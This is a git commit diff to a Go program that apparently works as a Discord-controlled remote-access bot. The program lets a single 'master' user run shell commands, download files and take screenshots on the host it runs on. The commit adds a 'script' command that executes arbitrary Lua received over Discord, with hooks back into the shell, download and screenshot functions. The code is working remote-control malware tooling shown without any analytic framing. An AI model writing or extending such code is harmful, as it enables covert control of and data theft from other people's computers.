6d80b7b5236dd444a6be073ddbcbc7d1a7b20fa8
HaiHakkuIku <HaiHakkuIku@users.noreply.github.com>
2017-06-19 04:28:19 +0100

    Added lua scripts

--- main.go
+++ main.go
@@ -10,9 +10,11 @@ import (
 	"io"
 	"bytes"
 	"image/png"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/vova616/screenshot"
+	"github.com/yuin/gopher-lua"
 )
 
 // Variables used for command line parameters
@@ -23,6 +25,8 @@ var (
 	BotNAME string
 
 	a_ver string
+	last_s *discordgo.Session
+	last_m *discordgo.MessageCreate
 )
 
 func init() {
@@ -56,10 +60,6 @@ func main() {
 	}
 	<-make(chan struct{})
 	return
-}
-
-func cmd_info(s *discordgo.Session,m *discordgo.MessageCreate){
-	_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
 }
 
 func cmd_cmd(s *discordgo.Session,m *discordgo.MessageCreate,comman_items []string){
@@ -98,6 +98,10 @@ func cmd_screenshot(s *discordgo.Session,m *discordgo.MessageCreate){
 
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
+
+	last_s = s
+	last_m = m
+
 	comman_items := strings.Split(m.Content," ")
 
 	if m.Author.ID == BotID || m.Author.ID != MasterID || BotNAME != comman_items[0] {
@@ -113,7 +117,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if comman_items[1] == "info" {
-		cmd_info(s,m)
+		_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
 	}
 
 	if comman_items[1] == "cmd" {
@@ -130,7 +134,42 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	if comman_items[1] == "screenshot" {
 		cmd_screenshot(s,m)
-
 	}
 
+	if comman_items[1] == "script" {
+		l := lua.NewState()
+  	defer l.Close()
+		l.SetGlobal("ext", l.NewFunction(lua_handle_ext))
+		l.SetGlobal("sleep", l.NewFunction(lua_handle_sleep))
+		err := l.DoString(m.Content[len(comman_items[1]) + len(BotNAME) + 2:len(m.Content)])
+		if(err!=nil){
+			_, _ = s.ChannelMessageSend(m.ChannelID, "ERROR: "+err.Error())
+		}
+	}
+
+}
+
+func lua_handle_sleep(l *lua.LState)int{
+	arg_cmd := l.ToInt(1)
+	time.Sleep(time.Duration(arg_cmd) * time.Millisecond)
+
+	return 1
+}
+
+func lua_handle_ext(l *lua.LState)int{
+	arg_cmd := l.ToString(1)
+	arg_param := l.ToString(2)
+
+	comman_items := strings.Split(arg_param," ")
+
+	switch arg_cmd {
+		case "screenshot":
+			cmd_screenshot(last_s,last_m)
+		case "download":
+			cmd_download(last_s,last_m,comman_items)
+		case "cmd":
+			cmd_cmd(last_s,last_m,comman_items)
+	}
+
+	return 1
 }
